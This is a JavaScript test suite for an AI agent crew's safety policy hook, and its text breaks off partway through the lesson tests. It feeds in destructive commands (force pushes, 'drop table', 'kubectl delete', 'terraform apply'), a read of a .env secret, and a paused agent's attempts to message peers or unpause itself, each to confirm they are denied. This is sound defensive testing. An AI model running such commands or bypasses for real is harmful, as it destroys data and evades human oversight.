// Tests the safety layer against a throwaway crew home: risk tiers and tiered approvals, one-shot posts, denial escalation and
// pauses, alerts, registering, the lesson lifecycle, and doctor's lesson and work-folder upkeep.
// node plugins/keelcrew/tests/safety.test.mjs
import { execFileSync, spawnSync } from 'node:child_process';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, statSync, utimesSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';

const root = dirname(dirname(fileURLToPath(import.meta.url)));
// Built from pieces so no shell guard mistakes this file's text for the command itself.
const PR_CREATE = ['gh', 'pr', 'create'].join(' ');
const tmp = (name) => mkdtempSync(join(tmpdir(), `keelcrew-${name}-`));
const DAY = 24 * 60 * 60_000;

// Core modules read KEELCREW_HOME when first imported, so set it before importing them.
const home = tmp('safety');
process.env.KEELCREW_HOME = home;
const { loadRules } = await import('../core/rules.mjs');
const risk = await import('../core/risk.mjs');
const { writeGrant } = await import('../core/grants.mjs');
const posts = await import('../core/posts.mjs');
const alerts = await import('../core/alerts.mjs');
const denials = await import('../core/denials.mjs');
const { readRegistry } = await import('../core/crew.mjs');
const memory = await import('../core/memory.mjs');
const { runDoctor } = await import('../core/doctor.mjs');

let bad = 0;
let n = 0;
const expect = (label, got, want) => {
  n++;
  if (JSON.stringify(got) !== JSON.stringify(want)) {
    bad++;
    console.log(`FAIL ${label}: ${JSON.stringify(got)}, want ${JSON.stringify(want)}`);
  }
};
const ok = (label, cond) => expect(label, !!cond, true);
const throws = (fn, re = /./) => {
  try {
    fn();
    return false;
  } catch (e) {
    return re.test(e.message);
  }
};
const git = (cwd, ...args) =>
  execFileSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@t', '-c', 'commit.gpgsign=false', '-c', 'core.hooksPath=/dev/null', ...args], { cwd, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] }).trim();
const commitFile = (repo, path, text) => {
  mkdirSync(dirname(join(repo, path)), { recursive: true });
  writeFileSync(join(repo, path), text);
  git(repo, 'add', '-A');
  git(repo, 'commit', '-q', '-m', `change ${path}`);
};
const lines = (k) => Array.from({ length: k }, (_, i) => `line ${i}`).join('\n') + '\n';

/* ---------- a crew home: a Mate folder with one repo that has an origin ---------- */

const leadDir = join(home, 'mate-home');
const svc = join(leadDir, 'svc');
const origin = join(home, 'origin.git');
mkdirSync(svc, { recursive: true });
git(home, 'init', '-q', '--bare', origin);
git(svc, 'init', '-q', '-b', 'main');
commitFile(svc, 'README.md', 'hello\n');
git(svc, 'remote', 'add', 'origin', origin);
git(svc, 'push', '-q', 'origin', 'main');
git(svc, 'checkout', '-q', '-b', 'app-1');
const config = { schemaVersion: 2, owner: 'Sam', shipMode: 'card', pack: 'brinewick', leadDir, trust: [], promptMode: 'ask', repos: { svc: { path: svc, baseBranch: 'main' } } };
writeFileSync(join(home, 'config.json'), JSON.stringify(config));

const crew = (args, sid = '') =>
  spawnSync('node', [join(root, 'cli', 'keelctl.mjs'), ...args], {
    env: { ...process.env, KEELCREW_HOME: home, CLAUDE_CODE_SESSION_ID: sid, CLAUDE_CODE_HOST_SESSION_ID: sid ? `local_${sid}` : '' },
    encoding: 'utf8',
  });
const hook = (input) => {
  const r = spawnSync('node', [join(root, 'hooks', 'policy.mjs')], { input: JSON.stringify(input), env: { ...process.env, KEELCREW_HOME: home }, encoding: 'utf8' });
  if (r.status !== 0) throw new Error(`policy exited ${r.status}: ${r.stderr}`);
  const out = r.stdout ? JSON.parse(r.stdout).hookSpecificOutput : null;
  return { decision: out?.permissionDecision ?? 'none', reason: out?.permissionDecisionReason ?? '' };
};
const preFull = (sid, cwd, tool_name, tool_input = {}) => hook({ hook_event_name: 'PreToolUse', cwd, session_id: sid, tool_name, tool_input });
const pre = (sid, cwd, tool, input) => preFull(sid, cwd, tool, input).decision;
const bash = (sid, cwd, command) => pre(sid, cwd, 'Bash', { command });

/* ---------- rules ---------- */
{
  const base = loadRules(undefined);
  const brinewick = loadRules('brinewick');
  expect('rules: every tier has the 14-day cap', [brinewick.risk.ttlMs.low, brinewick.risk.ttlMs.medium, brinewick.risk.ttlMs.high], [14 * 24 * 60 * 60_000, 14 * 24 * 60 * 60_000, 14 * 24 * 60 * 60_000]);
  expect('rules: risk sizes', brinewick.risk.size, { medium: 400, high: 1200 });
  ok('rules: the pack adds risk patterns', brinewick.risk.patterns.high.some((r) => r.why === 'database migrations') && !base.risk.patterns.high.some((r) => r.why === 'database migrations'));
  ok('rules: base risk patterns stay with a pack', brinewick.risk.patterns.high.some((r) => r.why === 'CI workflows'));
  expect('rules: denial limits', [brinewick.denials.consecutive, brinewick.denials.total, [...brinewick.denials.allowWhilePaused]], [5, 40, ['Read', 'Grep', 'Glob']]);
  expect('rules: post TTL', brinewick.posts.ttlMs, 30 * 60_000);
  expect('rules: lesson lifecycle', [brinewick.memory.candidateRetireMs, brinewick.memory.activeStaleMs], [30 * DAY, 90 * DAY]);
  ok('rules: approve_post is board-only', base.policy.boardOnlyTools.test('mcp__keelcrew-local__approve_post'));
  ok('rules: posts, denials and alerts are crew files', ['posts', 'denials', 'alerts'].every((d) => base.policy.crewFiles.test(`.keelcrew/${d}/x.json`)));
}

/* ---------- risk tiers ---------- */
{
  const brinewick = loadRules('brinewick');
  const base = loadRules(undefined);
  const ch = (path, added = 1, deleted = 0, removed = false) => ({ path, added, deleted, removed });
  expect('risk: a small ordinary change is low', risk.classifyRisk([ch('app/views.py', 20, 3)], brinewick), { tier: 'low', reasons: [], files: 1, added: 20, deleted: 3, base: null });
  const mig = risk.classifyRisk([ch('billing/migrations/0012_x.py'), ch('orders/migrations/0003_y.py'), ch('a.py')], brinewick, 'origin/develop');
  expect('risk: migrations are high, with every match counted', [mig.tier, mig.reasons, mig.base], ['high', ['database migrations: billing/migrations/0012_x.py and 1 more'], 'origin/develop']);
  expect('risk: settings are high', risk.classifyRisk([ch('app/settings.py')], brinewick).tier, 'high');
  expect('risk: auth and permissions are high', ['app/auth.py', 'app/permissions/x.py', 'billing/permissions.py'].map((p) => risk.classifyRisk([ch(p)], brinewick).tier), ['high', 'high', 'high']);
  expect('risk: raw SQL is medium', risk.classifyRisk([ch('reports/sql/daily.sql')], brinewick).reasons, ['raw SQL files: reports/sql/daily.sql']);
  expect('risk: deleted files are medium in the brinewick pack', risk.classifyRisk([ch('old.py', 0, 9, true)], brinewick).tier, 'medium');
  expect('risk: without the pack a deletion alone is low', risk.classifyRisk([ch('old.py', 0, 9, true)], base).tier, 'low');
  expect('risk: base patterns (CI) are high', risk.classifyRisk([ch('.github/workflows/ci.yml')], base).tier, 'high');
  expect('risk: 400 lines is medium', risk.classifyRisk([ch('a.py', 300, 100)], brinewick).reasons, ['400 lines changed (medium from 400)']);
  expect('risk: 1,200 lines is high', risk.classifyRisk([ch('a.py', 1000, 200)], brinewick).tier, 'high');
  expect('risk: the highest reason wins', risk.classifyRisk([ch('reports/sql/daily.sql'), ch('app/auth.py')], brinewick).tier, 'high');

  const parsed = risk.parseChanges('3\t1\ta.py\0-\t-\timg.png\0' + '2\t2\t\0old name.py\0new name.py\0' + '0\t5\tgone.py\0', 'gone.py\0');
  expect('risk: numstat parsing (binary, rename, deletion)', parsed, [ch('a.py', 3, 1), ch('img.png', 0, 0), ch('new name.py', 2, 2), ch('gone.py', 0, 5, true)]);

  // A real worktree: config.json names its base branch; origin has it.
  commitFile(svc, 'app/util.py', lines(10));
  expect('assess: low against origin', risk.assessRisk(svc, null, { packName: 'brinewick' }), { tier: 'low', reasons: [], files: 1, added: 10, deleted: 0, base: 'origin/main' });
  commitFile(svc, 'billing/sql/totals.sql', lines(5));
  git(svc, 'rm', '-q', 'README.md');
  git(svc, 'commit', '-q', '-m', 'drop readme');
  const med = risk.assessRisk(svc, null, { packName: 'brinewick' });
  expect('assess: raw SQL and a deletion are medium', [med.tier, med.reasons, med.files, med.deleted], ['medium', ['raw SQL files: billing/sql/totals.sql', 'deleted files: README.md'], 3, 1]);
  expect('assess: an explicit base works too', risk.assessRisk(svc, 'main', { packName: 'brinewick' }).tier, 'medium');
  const out = JSON.parse(crew(['risk', svc, '--json']).stdout);
  expect('cli: keelctl risk --json', [out.tier, out.files, out.base], ['medium', 3, 'origin/main']);
  ok('cli: keelctl risk text', /^Risk: medium\n {2}- raw SQL files: billing\/sql\/totals\.sql/.test(crew(['risk', svc]).stdout));

  // The base comes from the pack when the repo is one of its repos (brinewick-api ships from develop).
  const ds = join(home, 'elsewhere', 'brinewick-api');
  mkdirSync(ds, { recursive: true });
  git(home, 'init', '-q', '--bare', join(home, 'ds-origin.git'));
  git(ds, 'init', '-q', '-b', 'work');
  commitFile(ds, 'a.py', 'x\n');
  git(ds, 'remote', 'add', 'origin', join(home, 'ds-origin.git'));
  git(ds, 'push', '-q', 'origin', 'HEAD:develop');
  expect('assess: base branch from the pack', risk.baseBranchOf(ds, 'brinewick'), 'develop');
  expect('assess: compared with origin/develop', [risk.assessRisk(ds, null, { packName: 'brinewick' }).base, risk.assessRisk(ds, null, { packName: 'brinewick' }).tier], ['origin/develop', 'low']);
  const lonely = join(home, 'elsewhere', 'lonely');
  mkdirSync(lonely, { recursive: true });
  git(lonely, 'init', '-q', '-b', 'work');
  const unknown = risk.assessRisk(lonely, null, { packName: 'brinewick' });
  ok('assess: no base to compare with counts as high', unknown.tier === 'high' && /Couldn't compare/.test(unknown.reasons[0]));
  expect('assess: not a repo counts as high', risk.assessRisk(join(home, 'elsewhere'), 'main').tier, 'high');

  // Approvals last as long as their tier allows.
  const g = writeGrant({ key: 'APP-1', dir: svc, choice: 'Push only', via: 'test', packName: 'brinewick', head: 'a'.repeat(40) });
  expect('grant: assessed when no risk is given', [g?.risk, g && g.expires - g.at], ['medium', 14 * 24 * 60 * 60_000]);
  const gh = writeGrant({ key: 'APP-1', dir: svc, choice: 'Open PR', via: 'test', packName: 'brinewick', risk: { tier: 'high' } });
  expect('grant: a high-risk approval records its tier', [gh?.risk, gh && gh.expires - gh.at], ['high', 14 * 24 * 60 * 60_000]);
  const gl = writeGrant({ key: 'APP-1', dir: svc, choice: 'Draft PR', via: 'test', packName: 'brinewick', risk: 'low' });
  expect('grant: a low-risk approval records its tier', [gl?.risk, gl && gl.expires - gl.at], ['low', 14 * 24 * 60 * 60_000]);
  ok('grant: an unknown tier is refused', throws(() => writeGrant({ key: 'APP-1', dir: svc, choice: 'Push only', via: 'test', risk: 'huge' }), /risk must be/));
  expect('grant: "Not yet" still clears', writeGrant({ key: 'APP-1', dir: svc, choice: 'Not yet', via: 'test', packName: 'brinewick' }), null);
}

/* ---------- registering and unregistering ---------- */
const wt2 = join(leadDir, 'svc-worktrees', 'app-2');
const wt3 = join(leadDir, 'svc-worktrees', 'app-3');
const qaDir = join(home, 'work', 'qa-APP-1');
{
  for (const d of [wt2, wt3]) {
    mkdirSync(d, { recursive: true });
    writeFileSync(join(d, '.git'), 'gitdir: x\n');
  }
  mkdirSync(qaDir, { recursive: true });
  expect('register lead', crew(['register', 'lead', '-', leadDir], 'lead-1').status, 0);
  const e1 = crew(['register', 'engineer', 'app-1', svc], 'eng-1');
  ok('register engineer: joins the crew', e1.status === 0 && e1.stdout.includes('joined the crew as engineer for APP-1'));
  crew(['register', 'engineer', 'app-2', wt2], 'eng-2');
  const q = crew(['register', 'agent', 'app-1', qaDir, '--agent', 'qa'], 'qa-1');
  expect('register agent', q.status, 0);
  crew(['register', 'job', '-', leadDir, '--agent', 'learner'], 'job-1');
  let live = readRegistry();
  ok('registry: folders and sessions', !!live.dirs[svc] && !!live.dirs[wt2] && !!live.dirs[qaDir] && !!live.sessions['eng-2']);
  crew(['unregister', wt2], 'lead-1');
  crew(['register', 'engineer', 'app-3', wt3], 'eng-3');
  live = readRegistry();
  ok('unregister removes the folder', !live.dirs[wt2] && !!live.dirs[wt3]);
  ok('status lists the crew', crew(['status']).stdout.includes(svc));
}

/* ---------- one-shot posts ---------- */
{
  const p = posts.writePostGrant({ key: 'APP-1', tool: 'mcp__a__send_mail', match: 'Hello  Bob', via: 'test' });
  expect('posts: the file shape', Object.keys(JSON.parse(readFileSync(join(home, 'posts', `${p.id}.json`), 'utf8'))).sort(), ['at', 'expires', 'id', 'key', 'match', 'tool', 'uses', 'via']);
  expect('posts: defaults', [p.uses, p.match, p.expires - p.at], [1, 'Hello Bob', 30 * 60_000]);
  expect('posts: another tool', posts.consumePostGrant('mcp__a__send_message', { body: 'Hello Bob' }), null);
  expect('posts: text not in the input', posts.consumePostGrant('mcp__a__send_mail', { body: 'Hello Alice' }), null);
  expect('posts: another ticket', posts.consumePostGrant('mcp__a__send_mail', { body: 'Hello Bob' }, { key: 'APP-2' }), null);
  expect('posts: a match is used up', posts.consumePostGrant('mcp__a__send_mail', { to: ['bob'], body: { text: 'Hello\nBob, the notes' } }, { key: 'app-1' })?.id, p.id);
  expect('posts: only once', posts.consumePostGrant('mcp__a__send_mail', { body: 'Hello Bob' }), null);
  const re = posts.writePostGrant({ key: null, tool: '/^mcp__[^_]+__teams_post/', via: 'test' });
  expect('posts: a /regex/ tool and no text to match', posts.consumePostGrant('mcp__abc__teams_post_message', {})?.id, re.id);
  const old = posts.writePostGrant({ key: 'APP-1', tool: 'mcp__a__x', via: 'test', now: Date.now() - 31 * 60_000 });
  expect('posts: an expired approval is not used', posts.consumePostGrant('mcp__a__x', {}), null);
  ok('posts: and is cleared', !existsSync(join(home, 'posts', `${old.id}.json`)));
  ok('posts: a tool is required', throws(() => posts.writePostGrant({ key: 'A', tool: ' ', via: 't' }), /which tool/));
  ok('posts: a bad pattern is refused', throws(() => posts.writePostGrant({ key: 'A', tool: '/(/', via: 't' }), /valid regular expression/));
  ok('posts: a TTL must be sane', throws(() => posts.writePostGrant({ key: 'A', tool: 'x', via: 't', ttlMinutes: 0 })));

  // The policy: an approved post goes through once; without one, writes ask.
  const comment = 'gh issue comment 5 --body "Fixed in 1.2"';
  expect('policy: a GitHub write asks', bash('eng-1', svc, comment), 'ask');
  posts.writePostGrant({ key: 'APP-1', tool: 'Bash', match: 'gh issue comment 5', via: 'test' });
  const allowed = preFull('eng-1', svc, 'Bash', { command: comment });
  ok('policy: an approved post is allowed', allowed.decision === 'allow' && allowed.reason.includes('Sam approved this post on the board (one use)'));
  expect('policy: and only once', bash('eng-1', svc, comment), 'ask');
  posts.writePostGrant({ key: 'APP-1', tool: 'Bash', match: 'gh issue comment 6', via: 'test' });
  expect('policy: a post never carries a push', bash('eng-1', svc, 'git push origin HEAD && gh issue comment 6 --body x'), 'ask');
  expect('policy: the post is still there for the comment alone', bash('eng-1', svc, 'gh issue comment 6 --body x'), 'allow');
  expect('policy: a PR comment without approval asks', bash('eng-1', svc, 'gh pr comment 12 --body LGTM'), 'ask');
  posts.writePostGrant({ key: 'APP-1', tool: 'Bash', match: 'gh pr comment 12', via: 'test' });
  expect('policy: a post never carries a second write', bash('eng-1', svc, 'gh pr comment 12 --body LGTM && gh pr close 12'), 'ask');
  expect('policy: an approved PR comment', bash('eng-1', svc, 'gh pr comment 12 --body LGTM'), 'allow');
  const prPost = posts.writePostGrant({ key: 'APP-1', tool: 'Bash', match: 'pr create', via: 'test' });
  expect('policy: a post never opens a PR', bash('eng-1', svc, `${PR_CREATE} --title x`), 'ask');
  ok('policy: that post stays unused', existsSync(join(home, 'posts', `${prPost.id}.json`)));
  const mail = { message: { subject: 'Digest', body: 'Weekly digest for Sam' } };
  expect('policy: an engineer connector write runs', pre('eng-1', svc, 'mcp__0a1__outlook_send_mail', mail), 'none');
  // A drafts role still needs the captain's one-shot post for a connector write.
  crew(['register', 'job', '-', leadDir, '--agent', 'support'], 'sup-1');
  const note = { issueIdOrKey: 'APP-1', commentBody: 'Weekly digest for Sam' };
  expect('policy: a drafts connector write asks', pre('sup-1', leadDir, 'mcp__1a2b__addOrEditJiraIssueComment', note), 'ask');
  posts.writePostGrant({ key: null, tool: '/addOrEditJiraIssueComment$/', match: 'Weekly digest', via: 'test' });
  expect('policy: an approved connector post', pre('sup-1', leadDir, 'mcp__1a2b__addOrEditJiraIssueComment', note), 'allow');
  expect('policy: connector post only once', pre('sup-1', leadDir, 'mcp__1a2b__addOrEditJiraIssueComment', note), 'ask');
  expect('policy: approve_post is board-only for crew', pre('eng-1', svc, 'mcp__keelcrew-local__approve_post', {}), 'deny');
  expect('policy: and for everyone else', pre(undefined, home, 'mcp__keelcrew_local__approve_post', {}), 'deny');
  for (const d of ['posts', 'denials', 'alerts']) expect(`policy: ${d} can't be written by hand`, bash(undefined, svc, `echo {} > ~/.keelcrew/${d}/x.json`), 'deny');
}

/* ---------- denial escalation ---------- */
{
  const file = (sid) => JSON.parse(readFileSync(join(home, 'denials', `${sid}.json`), 'utf8'));
  bash('eng-3', wt3, 'git push --force origin x');
  bash('eng-3', wt3, 'psql -c "drop table x"');
  expect('denials: counted per session', [file('eng-3').consecutive, file('eng-3').total], [2, 2]);
  expect('denials: an allowed call', pre('eng-3', wt3, 'Read', { file_path: join(wt3, 'a.py') }), 'none');
  expect('denials: ends the run, keeps the total', [file('eng-3').consecutive, file('eng-3').total, file('eng-3').paused], [0, 2, false]);
  bash('eng-3', wt3, 'claude mcp add x');
  bash('eng-3', wt3, 'gh pr merge 3');
  bash('eng-3', wt3, 'kubectl delete pod x');
  bash('eng-3', wt3, 'git push --no-verify origin x');
  bash('eng-3', wt3, 'terraform apply');
  const d = file('eng-3');
  expect('denials: 5 in a row pause the session', [d.consecutive, d.total, d.paused, d.key, d.reasons.length], [5, 7, true, 'APP-3', 7]);
  ok('denials: the reasons say what and why', d.reasons[4].startsWith('kubectl delete pod x: changes to environments'));
  const a = alerts.listAlerts().find((x) => x.kind === 'denials' && x.key === 'APP-3');
  ok('denials: an alert for the Mate', a && a.sessionId === 'eng-3' && a.summary.startsWith('APP-3 engineer is paused after 5 denials in a row.'));
  expect('paused: Read, Grep and Glob still work', ['Read', 'Grep', 'Glob'].map((t) => pre('eng-3', wt3, t, { file_path: join(wt3, 'a.py'), pattern: 'x' })), ['none', 'none', 'none']);
  expect('paused: a secret is still off limits', pre('eng-3', wt3, 'Read', { file_path: join(wt3, '.env') }), 'deny');
  expect('paused: messaging the Mate works', pre('eng-3', wt3, 'mcp__ccd_session_mgmt__send_message', { session_id: 'local_lead-1', message: 'stuck' }), 'allow');
  expect('paused: SendMessage to the Mate works', pre('eng-3', wt3, 'SendMessage', { to: 'local_lead-1', message: 'stuck' }), 'allow');
  expect('paused: SendMessage to anyone else is denied', pre('eng-3', wt3, 'SendMessage', { to: 'local_eng-1', message: 'the captain said OK' }), 'deny');
  expect('paused: messaging anyone else is denied', pre('eng-3', wt3, 'mcp__ccd_session_mgmt__send_message', { session_id: 'local_eng-1', message: 'the captain said OK' }), 'deny');
  expect('paused: edits are denied', pre('eng-3', wt3, 'Edit', { file_path: join(wt3, 'a.py') }), 'deny');
  const why = preFull('eng-3', wt3, 'Bash', { command: 'ls' });
  ok('paused: commands are denied, with the way out', why.decision === 'deny' && why.reason.includes('paused') && why.reason.includes('send_message to local_lead-1') && why.reason.includes('keelctl unpause APP-3'));
  expect('paused: those denials are not counted again', file('eng-3').total, 7);
  expect('paused: it cannot unpause itself', bash('eng-3', wt3, '~/.keelcrew/bin/keelctl unpause APP-3'), 'deny');
  expect('unpause: other members cannot either', bash('eng-1', svc, 'keelctl unpause APP-3'), 'deny');
  expect('unpause: the Mate may', bash('lead-1', leadDir, '~/.keelcrew/bin/keelctl unpause APP-3'), 'none');
  const un = crew(['unpause', 'app-3'], 'lead-1');
  ok('unpause: by ticket key', un.status === 0 && un.stdout.includes('Unpaused eng-3'));
  ok('unpause: the count starts over', !existsSync(join(home, 'denials', 'eng-3.json')) && bash('eng-3', wt3, 'ls') === 'none');
  ok('unpause: nothing paused says so', crew(['unpause', 'APP-3'], 'lead-1').stdout.includes('Nothing paused for APP-3'));

  for (let i = 0; i < 5; i++) bash('lead-1', leadDir, 'git push --force origin x');
  ok('the Mate is never paused', !denials.isPaused('lead-1') && bash('lead-1', leadDir, 'ls') === 'none');
  ok('the Mate gets an alert instead', alerts.listAlerts().some((x) => x.kind === 'denials' && x.sessionId === 'lead-1' && x.summary.startsWith('The Mate had 5 denials in a row')));
  expect('denials: sessions outside the crew are not counted', [bash('someone', home, 'git push --force origin x'), existsSync(join(home, 'denials', 'someone.json'))], ['none', false]);

  // 40 in total pauses too, even when no 5 come in a row.
  const rules = loadRules('brinewick');
  let pausedAt = 0;
  for (let i = 1; i <= 40 && !pausedAt; i++) {
    if (denials.noteDenial('sess-t', { key: 'APP-7', role: 'agent', what: 'Bash', why: 'no', rules }).pausedNow) pausedAt = i;
    denials.noteAllowed('sess-t');
  }
  expect('denials: 40 in total pause the session', [pausedAt, denials.readDenials('sess-t')?.total], [40, 40]);
  ok('denials: the alert says in total', alerts.listAlerts().some((x) => x.sessionId === 'sess-t' && x.summary.includes('40 denials in total')));
  expect('unpause: by session id', crew(['unpause', 'sess-t'], 'lead-1').stdout.trim(), 'Unpaused sess-t. Its denial count starts over.');
}

/* ---------- members starting sessions ---------- */
{
  // Only the Mate starts sessions. A member's try is denied, whatever its input, and never counts toward a pause.
  bash('qa-1', qaDir, 'git push --force origin x');
  const before = denials.readDenials('qa-1');
  const start = (input) => hook({ hook_event_name: 'PreToolUse', cwd: qaDir, session_id: 'qa-1', tool_name: 'mcp__ccd_session__start_session', ...(input === undefined ? {} : { tool_input: input }) });
  const tries = [undefined, null, { title: 't', prompt: 'p' }, { initiation: 'own_initiative', proposal_id: 'p-1' }].map(start);
  expect('start_session: a member is denied with no input, no initiation, or to accept a proposal', tries.map((t) => t.decision), ['deny', 'deny', 'deny', 'deny']);
  ok('start_session: the denial says to tell the Mate instead', tries.every((t) => t.reason.includes('only the Mate starts sessions')));
  // Input that isn't an object meets the policy's "can't be checked" gate first, which asks in this file's promptMode.
  ok('start_session: input that is not an object never runs', ['start one', ['x']].map(start).every((t) => t.decision === 'ask' || t.decision === 'deny'));
  expect('start_session: none of those denials are counted', [before?.consecutive, before?.total, denials.readDenials('qa-1')], [1, 1, before]);
  ok('start_session: so six in a row pause nothing', !denials.isPaused('qa-1'));
}

/* ---------- alerts ---------- */
{
  const a = alerts.writeAlert({ kind: 'budget', key: 'APP-1', summary: 'APP-1 has used 85% of its budget.' });
  ok('alerts: id is <ts>-<kind>-<id>', /^\d+-budget-[0-9a-f]{6}$/.test(a.id) && existsSync(join(home, 'alerts', `${a.id}.json`)));
  expect('alerts: the file shape', JSON.parse(readFileSync(join(home, 'alerts', `${a.id}.json`), 'utf8')), a);
  ok('alerts: kinds are plain words', throws(() => alerts.writeAlert({ kind: 'Budget!', summary: 'x' })) && throws(() => alerts.writeAlert({ kind: 'budget', summary: ' ' })));
  const listed = JSON.parse(crew(['alerts', '--json']).stdout);
  ok('cli: keelctl alerts --json lists them, oldest first', listed.at(-1).id === a.id && listed.every((x, i) => i === 0 || listed[i - 1].at <= x.at));
  const added = crew(['alerts', 'add', '--kind', 'lost-session', '--summary', 'APP-2 lost its session', '--key', 'app-2'], 'job-1');
  ok('cli: keelctl alerts add (anyone)', added.status === 0 && alerts.listAlerts().some((x) => x.kind === 'lost-session' && x.key === 'APP-2' && x.sessionId === 'job-1'));
  expect('policy: any member may raise one', bash('eng-1', svc, 'keelctl alerts add --kind budget --summary x'), 'none');
  expect('policy: only the Mate clears them', bash(undefined, svc, '~/.keelcrew/bin/keelctl alerts seen all'), 'deny');
  expect('policy: the Mate may', bash('lead-1', leadDir, 'keelctl alerts seen all'), 'none');
  const raised = new Date(Date.now() - 20 * 86_400_000);
  utimesSync(join(home, 'alerts', `${a.id}.json`), raised, raised);
  expect('cli: keelctl alerts seen <id>', crew(['alerts', 'seen', a.id], 'lead-1').stdout.trim(), 'Marked 1 alert seen.');
  ok('alerts: moved to alerts/seen', existsSync(join(home, 'alerts', 'seen', `${a.id}.json`)) && alerts.listAlerts({ seen: true }).some((x) => x.id === a.id));
  ok('alerts: aged from when they were seen', Date.now() - statSync(join(home, 'alerts', 'seen', `${a.id}.json`)).mtimeMs < 60_000);
  expect('cli: an unknown alert fails', crew(['alerts', 'seen', 'nope'], 'lead-1').status, 1);
  expect('alerts: no path tricks', alerts.markAlertSeen('../crew'), []);
  const left = alerts.listAlerts().length;
  expect('cli: keelctl alerts seen all', crew(['alerts', 'seen', 'all'], 'lead-1').stdout.trim(), `Marked ${left} alert${left === 1 ? '' : 's'} seen.`);
  expect('alerts: none left for the panel', readdirSync(join(home, 'alerts')).filter((f) => f.endsWith('.json')), []);
  ok('cli: keelctl alerts with none', crew(['alerts']).stdout.includes('No alerts.'));
}

/* ---------- lesson lifecycle ---------- */
{
  const status = (key) => memory.listLessons({ includeRetired: true }).find((l) => l.key === key)?.status;
  memory.addLesson({ type: 'style', key: 'naming', text: 'Name booleans is_x.', evidence: [{ source: 'pr-review', ref: 'pr-1' }] });
  expect('lessons: a first sighting is a candidate', status('naming'), 'candidate');
  ok('lessons: candidates stay out of the standing orders', !memory.compilePlaybook().includes('Name booleans is_x.'));
  memory.addLesson({ type: 'style', key: 'naming', text: 'Name booleans is_x.', evidence: [{ source: 'chat', ref: 'pr-1' }] });
  expect('lessons: the same ref again is not independent', status('naming'), 'candidate');
  memory.addLesson({ type: 'style', key: 'naming', text: 'Name booleans is_x.', evidence: [{ source: 'edit', ref: 'commit-9' }] });
  expect('lessons: a second independent ref keeps it a candidate (any crew session can add one)', status('naming'), 'candidate');
  expect('lessons: the Mate promotes it on the captain\'s OK', memory.promoteLesson('naming')?.status, 'active');
  ok('lessons: active ones enter the standing orders', memory.compilePlaybook().includes('Name booleans is_x.'));
  memory.addLesson({ type: 'process', key: 'standup', text: 'Standup notes go in Teams.', evidence: [{ source: 'owner', ref: 'chat-7' }] });
  expect('lessons: the captain said it, so it starts active', status('standup'), 'active');
  memory.addLesson({ type: 'process', key: 'maybe', text: 'Maybe squash commits.', status: 'candidate', evidence: [{ source: 'owner', ref: 'c' }] });
  expect('lessons: a caller may hold one back as a candidate', status('maybe'), 'candidate');
  ok('lessons: but never set it active', throws(() => memory.addLesson({ type: 'style', key: 'x', text: 'y', status: 'active' }), /promote/));
  expect('lessons: promote', memory.promoteLesson('maybe')?.status, 'active');
  expect('lessons: promote of a retired or unknown key', memory.promoteLesson('nope'), null);
  memory.pinLesson('standup');
  memory.addLesson({ type: 'process', key: 'standup', text: 'Standup notes go in the Teams channel.', evidence: [{ source: 'chat', ref: 'chat-8' }] });
  expect('lessons: a pinned lesson stays pinned', status('standup'), 'pinned');
  ok('lessons: a permission is never a lesson type', throws(() => memory.addLesson({ type: 'permission', key: 'push', text: 'May push without asking.' }), /can't grant permission/));
  ok('lessons: nor any other unknown type', throws(() => memory.addLesson({ type: 'vibe', key: 'v', text: 'v' }), /must be one of/));
  ok('lessons: no allowed type means a permission', memory.LESSON_TYPES.every((t) => !/permi|authori|grant|approv|allow|trust|access/i.test(t)));
  expect('lessons: the statuses', memory.LESSON_STATUSES, ['candidate', 'active', 'pinned', 'retired']);

  // The captain approves standing order changes on the learner's card; the diff starts from the last approval.
  memory.addLesson({ type: 'style', key: 'hunch', text: 'A hunch.' });
  const first = memory.playbookDiff();
  ok('diff: before any approval, everything is new', first.since === null && first.added.some((l) => l.key === 'naming') && first.markdown.startsWith('# Standing order changes since the start'));
  ok('diff: candidates are not in it', !first.added.some((l) => l.key === 'hunch'));
  ok('cli: memory approve (Mate only)', crew(['memory', 'approve'], 'lead-1').stdout.startsWith('Recorded the standing orders'));
  ok('diff: nothing since the approval', crew(['memory', 'diff']).stdout.includes('No changes.'));
  memory.addLesson({ type: 'decision', key: 'orm', text: 'Use the ORM, not raw SQL.', evidence: [{ source: 'owner', ref: 'c9' }] });
  memory.editLesson('naming', 'Name booleans is_x or has_x.');
  memory.forgetLesson('maybe');
  const d = JSON.parse(crew(['memory', 'diff', '--json']).stdout);
  expect('diff: added, changed and removed', [d.added.map((l) => l.key), d.changed.map((c) => [c.key, c.before.text, c.after.text]), d.removed.map((l) => l.key)], [['orm'], [['naming', 'Name booleans is_x.', 'Name booleans is_x or has_x.']], ['maybe']]);
  ok('diff: markdown for the card', /## Added\n\n- Use the ORM, not raw SQL\. \(decision, everywhere\)/.test(d.markdown) && d.markdown.includes('## Removed'));

  // Who may move a lesson along: the Mate. Others add what they saw.
  for (const c of ['memory promote naming', 'memory edit naming --text x', 'memory approve', 'memory forget naming', 'memory pin naming']) expect(`policy: ${c} is Mate-only`, bash(undefined, svc, `keelctl ${c}`), 'deny');
  expect('policy: anyone may see the diff', bash(undefined, svc, 'keelctl memory diff'), 'none');
  expect('policy: a member cannot claim the captain said it', bash(undefined, svc, 'keelctl memory add --type style --key k --text t --source owner'), 'deny');
  expect('policy: nor with =', bash(undefined, svc, "keelctl memory add --type style --key k --text t --source='owner'"), 'deny');
  expect('policy: a member records what it saw', bash(undefined, svc, 'keelctl memory add --type style --key k --text t --source chat --ref c1'), 'none');
  expect('policy: the Mate records what the captain said', bash('lead-1', leadDir, 'keelctl memory add --type style --key k --text t --source owner'), 'none');
  ok('cli: memory add says candidate', crew(['memory', 'add', '--type', 'style', '--key', 'tabs', '--text', 'Tabs.', '--source', 'edit', '--ref', 'e1']).stdout.includes('as a candidate'));

  // Upkeep: candidates unseen for 30 days retire with --fix; active lessons unseen for 90 days are flagged.
  const now = Date.now();
  memory.addLesson({ type: 'style', key: 'old-cand', text: 'An old hunch.', at: now - 31 * DAY });
  memory.addLesson({ type: 'style', key: 'old-active', text: 'An old rule.', at: now - 91 * DAY, evidence: [{ source: 'owner', ref: 'o' }] });
